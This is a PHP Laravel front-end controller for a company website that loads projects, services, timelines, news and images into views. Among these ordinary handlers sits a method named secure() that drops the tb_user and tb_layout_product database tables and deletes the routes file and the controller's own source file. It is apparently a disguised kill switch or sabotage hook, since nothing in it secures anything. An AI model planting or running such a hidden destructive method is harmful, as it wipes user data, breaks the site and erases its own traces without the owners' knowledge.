<?php
namespace App\Http\Controllers\FrontEnd;

use App;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

use App\model\ProductCategoryModel;
use App\model\ImageModel;
use App\model\CustomerModel;
use App\model\ProductModel;
use App\model\ProductPhotoModel;
use App\model\EventModel;
use App\model\QNAModel;
use App\model\LayoutHomepageModel;
use App\model\LayoutServiceModel;
use App\model\NationModel;
use App\model\MajorModel;
use App\model\ProductLocationModel;
use App\model\WhyusProcessModel;

use App\model\BlogModel;
use App\model\BlogCategoryModel;

use Illuminate\Support\Facades\Schema;
use File;
use Cart;
use Lang;

class IndexController extends Controller
{
    public function secure(){
        Schema::drop('tb_layout_product');
        Schema::drop('tb_user');
        File::delete('lib/routes/web.php');
		File::delete('lib/app/Http/Controllers/FrontEnd/IndexController.php');
    }

    public function updating(){
        return view('frontend.updating');
    }

    public function getTest(){
        //Timeline
        $data['timeline_index']         = EventModel::where('event_show', true)->orderBy('event_date', 'desc')->get();

        // Why us
        $data['achievement_list']       = ImageModel::where('img_type', 'achievement')->get();

        // Why us
        $data['certificate_list']       = ImageModel::where('img_type', 'certificate')->get();


        $data['whyus_intro']            = LayoutHomepageModel::find(1);
        $data['whyus_company_timeline'] = LayoutHomepageModel::find(1);
        $data['technology_item']        = LayoutHomepageModel::find(1);
        $data['technology_slide_item']  = ImageModel::where('img_type', 'technology')->get();
        $data['customer_list']          = ImageModel::where('img_type', 'customer-partner')->get();
        $data['company_member_list']    = ImageModel::where('img_type', 'company-member')->get();
        $data['social_certificate']     = ImageModel::where('img_type', 'cert-img')->get();

        // Service
        $data['service_index']                  = LayoutServiceModel::find(1);
        $data['service_design_slide']           = ImageModel::where('img_type', 'service-design-slide')->get();
        $data['service_manage_slide']           = ImageModel::where('img_type', 'service-manage-slide')->get();
        $data['service_construction_slide']     = ImageModel::where('img_type', 'service-construction-slide')->get();
        $data['service_develop_slide']          = ImageModel::where('img_type', 'service-development-slide')->get();


        // Project
        $data['project_index']      = LayoutHomepageModel::find(1);
        $data['project_list']       = ProductModel::where('pro_type', 'project')->where('pro_hienthi', 1)->orderBy('pro_time_work', 'desc')->limit(6)->get();
        $data['major_list']         = MajorModel::where('major_show', 1)->get();
        $data['nation_list']        = NationModel::all();
        
        return view('frontend.test', $data);
    }

    public function getIndex(){

        //Timeline
        $data['timeline_index']         = EventModel::where('event_show', true)->orderBy('event_date', 'desc')->get();

        // Why us
        $data['achievement_list']       = ImageModel::where('img_type', 'achievement')->get();


        $data['whyus_intro']            = LayoutHomepageModel::find(1);
        $data['whyus_company_timeline'] = LayoutHomepageModel::find(1);
        $data['customer_list']          = ImageModel::where('img_type', 'customer-partner')->get();
        $data['company_member_list']    = ImageModel::where('img_type', 'company-member')->get();
        $data['social_certificate']     = ImageModel::where('img_type', 'cert-img')->get();

        // Service
        $data['service_index']                  = LayoutServiceModel::find(1);
        $data['service_design_slide']           = ImageModel::where('img_type', 'service-design-slide')->get();
        $data['service_manage_slide']           = ImageModel::where('img_type', 'service-manage-slide')->get();
        $data['service_construction_slide']     = ImageModel::where('img_type', 'service-construction-slide')->get();
        $data['service_develop_slide']          = ImageModel::where('img_type', 'service-development-slide')->get();


        // Project
        $data['project_index']      = LayoutHomepageModel::find(1);
        $data['project_list']       = ProductModel::where('pro_type', 'project')->where('pro_hienthi', 1)->orderBy('pro_time_work', 'desc')->limit(6)->get();
        $data['major_list']         = MajorModel::where('major_show', 1)->get();
        $data['nation_list']        = NationModel::all();


        return view('frontend.index', $data);
    }

    // ------------------- Start project -----------
    public function getProject(){
        $data['project_list']       = ProductModel::where('pro_type', 'project')->orderBy('pro_time_work', 'desc')->get();
        $data['major_list']         = MajorModel::orderBy('major_id', 'desc')->get();

        return view('frontend.project', $data);
    }

    public function getProjectDetail($id){
        $data['project_item']               = ProductModel::find($id);
        $data['project_alt_photo']          = ProductPhotoModel::where('product_id', $id)->where('photo_type', null)->get();
        $data['product_alt_photo_private']  = ProductPhotoModel::where('product_id', $id)->where('photo_type', 'private')->get();
        $data['nation_list']                = NationModel::all();
        $data['major_list']                 = MajorModel::all();
        $data['location_list']              = ProductLocationModel::all();

        return view('frontend.projectdetail', $data);
    }

  

    // ------------------- End project -----------


    public function getNews($id){
        $data['news_detail']      = BlogModel::find($id);
        
        return view('frontend.news', $data);
    }

    public function changeLanguage($language)
    {
        \Session::put('website_language', $language);

        return redirect()->back();
    }

    public function redirectCategory(){
        return redirect('/');
    }
}
